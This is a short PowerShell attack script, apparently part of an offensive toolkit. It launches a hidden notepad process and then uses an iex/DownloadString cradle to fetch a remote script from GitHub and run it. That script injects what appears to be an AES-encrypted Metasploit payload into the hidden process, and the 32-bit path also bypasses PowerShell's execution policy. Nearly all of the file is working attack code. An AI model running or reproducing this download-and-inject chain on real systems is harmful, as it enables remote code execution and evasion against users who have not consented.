# Written by @b4rtik

####################
#
# Copyright (c) 2018 @b4rtik
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISNG FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
####################

function Run-Proc32
{ 
    $startinfo = New-Object System.Diagnostics.ProcessStartInfo
    $startinfo.FileName = "C:\Windows\SysWOW64\notepad.exe"
    $startinfo.WindowStyle = 'Hidden'
    $startinfo.CreateNoWindow = $True
    $Proc = [Diagnostics.Process]::Start($startinfo)

    return $Proc.id

}

function Run-Proc64
{ 
    $startinfo = New-Object System.Diagnostics.ProcessStartInfo
    $startinfo.FileName = "C:\Windows\notepad.exe"
    $startinfo.WindowStyle = 'Hidden'
    $startinfo.CreateNoWindow = $True
    $Proc = [Diagnostics.Process]::Start($startinfo)

    return $Proc.id

}

function Invoke-Msf5Aes256Payload
{
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
        [ValidateSet("Win32","x64")]
        [string]
        $arch = "x64"
          )
    
    switch($arch){
        'Win32'{ 
                write-warning 'Run Win32 notepad'
                $procId = Run-Proc32
                &"c:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -noni -noprofile -Execution bypass "iex((New-Object system.net.webclient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Run-Msf5Aes256Payload.ps1'));Run-Msf5Aes256Payload -ProcessId $procId"
            }
        'x64'  {
                write-warning 'Run x64 notepad'
                iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Run-Msf5Aes256Payload.ps1')) 
                $procId = Run-Proc64
                Run-Msf5Aes256Payload -ProcessId $procId
            }
    }
}